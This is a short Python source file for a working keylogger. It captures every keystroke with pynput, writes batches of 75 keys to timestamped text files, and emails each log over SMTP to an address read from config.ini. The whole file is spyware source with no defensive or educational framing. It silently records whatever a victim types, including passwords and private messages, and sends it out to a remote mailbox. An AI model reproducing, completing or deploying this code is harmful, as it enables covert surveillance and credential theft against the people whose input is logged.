import os.path
from datetime import datetime
from pynput.keyboard import Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import logging
import configparser

keystrokes = []
LOG_FILE = "keylog.log"
logfile = ""

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG)


def on_press(keypress):
    global keystrokes
    keystrokes.append(keypress)

    if len(keystrokes) >= 75:
        write_to_file()
        send_email()


def write_to_file():
    global keystrokes
    global logfile

    if len(keystrokes) >= 75:
        if not logfile or os.path.getsize(logfile) >= 75:
            logfile = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

    with open(logfile, "a") as file:
        for key in keystrokes:
            file.write(str(key) + "\n")
    keystrokes = []


def send_email():
    config = configparser.ConfigParser()
    config.read('config.ini')
    from_addr = config['EMAIL']['Username']
    to_addr = config['EMAIL']['Recipient']
    password = config['EMAIL']['Password']
    smtp_server = config['SMTP']['Server']
    smtp_port = int(config['SMTP']['Port'])

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Keylog'

    with open(logfile, "r") as file:
        body = file.readlines()

    msg.attach(MIMEText("".join(body), 'plain'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(from_addr, password)
        text = msg.as_string()
        server.sendmail(from_addr, to_addr, text)
        server.quit()
        logging.info('Email sent successfully')
    except Exception as e:
        logging.error(f'Failed to send email: {e}')


def setup_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


def main():
    setup_logging()

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
